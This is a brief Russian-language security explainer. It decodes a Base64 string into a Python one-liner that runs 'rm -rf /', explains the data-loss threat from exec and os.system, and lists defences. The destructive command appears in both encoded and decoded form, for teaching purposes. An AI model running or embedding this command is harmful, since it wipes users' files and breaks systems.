# Деобфускация

Исходная строка:

```text
aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=
```

Результат декодирования Base64:

```text
import os; os.system('rm -rf /')
```

Для декодирования достаточно base64.b64decode(a).decode("utf-8").
Полученная строка рассматривалась как текст и не выполнялась.

## Угроза

exec запускает скрытый код, а os.system передаёт оболочке команду
rm -rf /. Она пытается рекурсивно удалить файлы от корня файловой системы
без обычных запросов подтверждения. Возможны потеря данных и нарушение
работы ОС. Ущерб зависит от прав процесса и защиты системы: современный
GNU rm по умолчанию блокирует рекурсивное удаление самого корня.

Base64 — это кодирование, а не шифрование или проверка безопасности.

## Защита

- Не выполнять неизвестные строки через exec и eval.
- Проверять входные данные и не передавать их напрямую командной оболочке.
- Использовать статический анализ и проверку кода.
- Ограничивать права программы и хранить резервные копии.
